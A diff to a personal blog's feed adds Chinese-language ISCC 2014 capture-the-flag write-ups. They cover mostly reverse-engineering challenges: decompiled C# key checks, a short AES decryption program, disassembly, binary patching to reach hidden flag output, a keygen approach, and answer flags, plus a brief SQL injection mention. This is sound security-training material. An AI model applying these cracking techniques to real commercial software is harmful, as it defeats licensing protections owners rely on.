+<li><strong>上古神兽</strong></li>
+</ul>
+<p>传说中的神兽，变量覆盖让人猜简直丧病，但是知道是G=2这回事以后就觉得是我们傻X了</p>
+<figure data-type="image" tabindex="23"><img src="http://zend3.qiniudn.com/Blog-ISCC10.png" alt="10" loading="lazy"></figure>
+<p>下面就是注入了 receiver参数没有过滤</p>
+<blockquote>
+<p>Flag ：8froerf9pu34rjeslfh</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ISCC2014 总结&writeup(一）]]></title>
+        <id>https://pikez.github.io/post/iscc-2014-zong-jie-and-writeup-yi/</id>
+        <link href="https://pikez.github.io/post/iscc-2014-zong-jie-and-writeup-yi/">
+        </link>
+        <updated>2014-10-03T13:50:43.000Z</updated>
+        <summary type="html"><![CDATA[<p>总的来说是非常有收获的一个多月，但是最后差了一点没能进入决赛还是特别特别的遗憾，最后20分钟竟然从27名掉到了32名，太让人心碎了。只能怪自己实力还是不足啊。明年再战！ 其实在比赛一开始的时候觉得好多都不会，逆向已经是凝聚招新那会接触过得了，早已忘光。还有各种misc没接触过，无线包分析，安卓逆向，缓冲区溢出等等。充实了一个多月还是比较满足的。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>总的来说是非常有收获的一个多月，但是最后差了一点没能进入决赛还是特别特别的遗憾，最后20分钟竟然从27名掉到了32名，太让人心碎了。只能怪自己实力还是不足啊。明年再战！ 其实在比赛一开始的时候觉得好多都不会，逆向已经是凝聚招新那会接触过得了，早已忘光。还有各种misc没接触过，无线包分析，安卓逆向，缓冲区溢出等等。充实了一个多月还是比较满足的。</p>
+ <!--more--> 
+<figure data-type="image" tabindex="1"><img src="http://zend3.qiniudn.com/Blog-ISCC.png" alt="00" loading="lazy"></figure>
+<p>晒下得分吧，虽然比较渣。 writeup是做题的同时就写的了，思路啥的比较蛋疼，很罗嗦也比较幼稚 = =。好多大牛都在快结束的时候写了，看看别人的比较好，自己的留个记录吧。</p>
+<h3 id="reverse">Reverse</h3>
+<ul>
+<li><strong>找到杀手</strong></li>
+</ul>
+<p>一开始把程序扔进IDA，没显示出代码，用peid看到是C#写的，然后就用Reflector打开反编译试试，果然出现了<br>
+<img src="http://zend3.qiniudn.com/Blog-ISCC1.png" alt="01" loading="lazy"></p>
+<p>找到验证处的代码</p>
+<pre><code>private bool CheckKey()
+{
+ string str = this.textBox1.Text.ToString();
+ string str2 = &amp;amp;quot;DI0PFY8TP9x61YTtUkmqYQ==&amp;amp;quot;;
+ return (str == str2);
+}
+</code></pre>
+<p>输进去后出现了四张扑克牌图片，都有flag信息，一个个试一下就OK。 没反应过来这题为何这么简单，大概他想考得不是这样，因为还给了个密文txt，程序里还有加密解密函数。不管咋做的，能对就行。</p>
+<blockquote>
+<p>Flag:God bless you</p>
+</blockquote>
+<ul>
+<li><strong>避难母国</strong></li>
+</ul>
+<p>题目的意思应该是让Andy的数字最大，然后就能输出Flag，一开始脑子没反应过来，傻乎乎的跟进程序，去看算法如何将Andy的数字弄到最大，但是运行几次后发现如果Andy的数字最大，会再次进行随机，不会输出Key。所以下面要做的应该是在Andy数字最大时跳转到输出函数（没去想不是最大数能不能跳转 = =）。</p>
+<p>跟进程序，找到输出3人数字的部分，call sub_13B13Db的函数就是随机数函数吧，不管它，往下走</p>
+<figure data-type="image" tabindex="2"><img src="http://zend3.qiniudn.com/Blog-ISCC2.png" alt="02" loading="lazy"></figure>
+<p>中间有各种判断条件，通过修改数值进行需要的跳转。</p>
+<figure data-type="image" tabindex="3"><img src="http://zend3.qiniudn.com/Blog-ISCC3.png" alt="03" loading="lazy"></figure>
+<p>这里应该是一个最后输出key的循环，这里可以通过修改判断条件edi使循环输出，var_9c里面的数值直接使用的话是不对的，它进行了一个排序，还有不能修改esi，会影响结果。</p>
+<figure data-type="image" tabindex="4"><img src="http://zend3.qiniudn.com/Blog-ISCC4.png" alt="04" loading="lazy"></figure>
+<p>（不要在意那个溢出吧 = =）</p>
+<blockquote>
+<p>Flag：FireInTheHole</p>
+</blockquote>
+<ul>
+<li><strong>流亡齐国</strong></li>
+</ul>
+<p>这题还是c#程序，有了前面的经验，直接扔进Reflector，找到验证部分的代码</p>
+<pre><code>private void button1_Click(object sender, EventArgs e)
+{
+	string text = this.textBox1.Text;
+	string str2 = Encrypt(text);
+	if ((text != &quot;&quot;) &amp;&amp; (str2 == &quot;sXeC6p/mrl93Jyq3F79+Jg==&quot;))
+	{
+	MessageBox.Show(&quot;猜对了！KEY就是你输入的东西&quot;, &quot;成功&quot;,
+	MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+	}
+	else
+	{
+	MessageBox.Show(&quot;猜错了！请重新猜吧&quot; + str2, &quot;失败&quot;,
+	MessageBoxButtons.OK, MessageBoxIcon.Hand);
+	this.textBox1.Text = &quot;&quot;;
+	}
+}
+</code></pre>
+<p>有个加密过程，看到加密代码</p>
+<pre><code>public static string Encrypt(string toEncrypt)
+{
+	byte[] bytes = Encoding.UTF8.GetBytes(&quot;swpu2012swpu2012swpu2012swpu2012&quot;);
+	yte[] inputBuffer = Encoding.UTF8.GetBytes(toEncrypt);
+	RijndaelManaged managed = new RijndaelManaged();
+	managed.Key = bytes;
+	managed.Mode = CipherMode.ECB;
+	managed.Padding = PaddingMode.PKCS7;
+	byte[] inArray = managed.CreateEncryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
+	return Convert.ToBase64String(inArray, 0, inArray.Length);
+}
+</code></pre>
+<p>用的c#自带的加密类，看了下MSDN，学着把解密函数写了下，用vs运行一下就OK</p>
+<pre><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+namespace ConsoleApplication1
+{
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] bytes = Encoding.UTF8.GetBytes(&amp;amp;quot;swpu2012swpu2012swpu2012swpu2012&amp;amp;quot;);
+            string str2 = &amp;amp;quot;sXeC6p/mrl93Jyq3F79+Jg==&amp;amp;quot;;
+            byte[] inArray = System.Convert.FromBase64String(str2);
+
+            foreach (byte b in str2)
+
+            {
+
+                Console.Write(b + &amp;amp;quot; &amp;amp;quot;);
+
+            }
+
+            Console.WriteLine(&amp;amp;quot; &amp;amp;quot;);
+
+            string plaintext = null;
+
+            RijndaelManaged managed = new RijndaelManaged();
+
+            managed.Key = bytes;
+
+            managed.Mode = CipherMode.ECB;
+
+            managed.Padding = PaddingMode.PKCS7;
+
+            byte[] result = managed.CreateDecryptor().TransformFinalBlock(inArray, 0, inArray.Length);
+
+            string str = System.Text.Encoding.Default.GetString(result);
+
+            Console.WriteLine(str);
+
+            //string final = Encoding.UTF8.GetBytes(toEncrypt);
+
+            // Keep the console window open in debug mode.
+
+            Console.WriteLine(&amp;amp;quot;Press any key to exit.&amp;amp;quot;);
+
+            Console.ReadKey();
+
+        }
+
+    }
+
+}            
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="http://zend3.qiniudn.com/Blog-ISCC5.png" alt="05" loading="lazy"></figure>
+<blockquote>
+<p>Flag：Ae5_3nCrYpT1on</p>
+</blockquote>
+<ul>
+<li><strong>宗女齐姜</strong></li>
+</ul>
+<p>C程序，果断扔IDA，F9调试走起，找到密码验证部分</p>
+<pre><code>.text:013E10A0 lea     ecx, [ebp+var_74]
+
+.text:013E10A3 push    ecx
+
+.text:013E10A4 push    offset aS       ; &amp;amp;quot;%s&amp;amp;quot;
+
+.text:013E10A9 call    ds:scanf
+
+.text:013E10AF add     esp, 0Ch
+
+.text:013E10B2 mov     ecx, offset aHellow ; &amp;amp;quot;hellow&amp;amp;quot;
+
+.text:013E10B7 lea     eax, [ebp+var_74]
+
+.text:013E10BA lea     ebx
+</code></pre>
+<p></p>
+<p>输进去后出来密码Too simple 。。</p>
+<figure data-type="image" tabindex="6"><img src="http://zend3.qiniudn.com/Blog-ISCC6.png" alt="06" loading="lazy"></figure>
+<blockquote>
+<p>Flag:Eaglewatch</p>
+</blockquote>
+<ul>
+<li><strong>何去何从</strong></li>
+</ul>
+<p>打开IDA忽视了前面的重点，直接跳到下面这部分</p>
+<figure data-type="image" tabindex="7"><img src="http://zend3.qiniudn.com/Blog-ISCC7.png" alt="07" loading="lazy"></figure>
+<p>我以为在strcmp那覆盖返回地址让它跳到401000 。纠结了好久。。才发现不行的，关键点是在前面</p>
+<figure data-type="image" tabindex="8"><img src="http://zend3.qiniudn.com/Blog-ISCC8.png" alt="08" loading="lazy"></figure>
+<p>这里通过修改v5的数值判断成功，然后修改call的地址为401000（初始是调用退出函数）<br>
+进入函数后进行了一个循环得到flag，只不过储存在栈里面。不进行输出的。</p>
+<figure data-type="image" tabindex="9"><img src="http://zend3.qiniudn.com/Blog-ISCC9.png" alt="09" loading="lazy"></figure>
+<blockquote>
+<p>Flag:(3q&amp;vf2vw%f7Vj9Ookj)</p>
+</blockquote>
+<ul>
+<li><strong>逃离临淄</strong><br>
+首先通过消息断点和字符串查找，找到关键的位置</li>
+</ul>
+<figure data-type="image" tabindex="10"><img src="http://zend3.qiniudn.com/Blog-ISCC12.png" alt="12" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="http://zend3.qiniudn.com/Blog-ISCC11.png" alt="11" loading="lazy"></figure>
+<p>这里先判断了输入的注册码是否为32位并进行了如下的转化，不符合要求就退出。</p>
+<p>大小写字母向后移动13位，数字向后移动5位，如：</p>
+<p>原 :abcdefghijklmnopqrstuvwxyz1234567890</p>
+<p>后 :nopqrstuvwxyzabcdefghijklm6789012345</p>
+<figure data-type="image" tabindex="12"><img src="http://zend3.qiniudn.com/Blog-ISCC32.png" alt="32" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="http://zend3.qiniudn.com/Blog-ISCC23.png" alt="23" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="http://zend3.qiniudn.com/Blog-ISCC28.png" alt="28" loading="lazy"></figure>
+<p>分析过程大致就这样，给出一个用户名iscc的注册码vabcde-ghijkl-695356a6342440747</p>
+<p>注册机用C 语言写成，写的过程中发现不可能实现任意用户名任意时间的注册，因为生成的那个hash值有可能使得注册码少于31位而不成功（纠结了好会~~）, 所以位数不够就重新再生成一次。</p>
+<p>后面的题目因为复习没时间做出来了，找个时间补上</p>
+<ul>
+<li><strong>宝藏探秘</strong></li>
+</ul>
+<blockquote>
+<p>flag:e41cf485e2a0e8707ff8fc0291f55cec</p>
+</blockquote>
+<ul>
+<li><strong>秦王周室</strong></li>
+</ul>
+<blockquote>
+<p>flag:</span>C6ua3izS2ze9Wetx</p>
+</blockquote>
+<ul>
+<li><strong>退避三舍</strong></li>
+</ul>
+<blockquote>
+<p>flag:</span>MD5_is_easy+C9841-4FF72-14430-D82EF-B6AC2</p>
+</blockquote>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Openssl "Heartbleed" 漏洞分析]]></title>
         <id>https://pikez.github.io/post/openssl-heartbleed-lou-dong-fen-xi/</id>
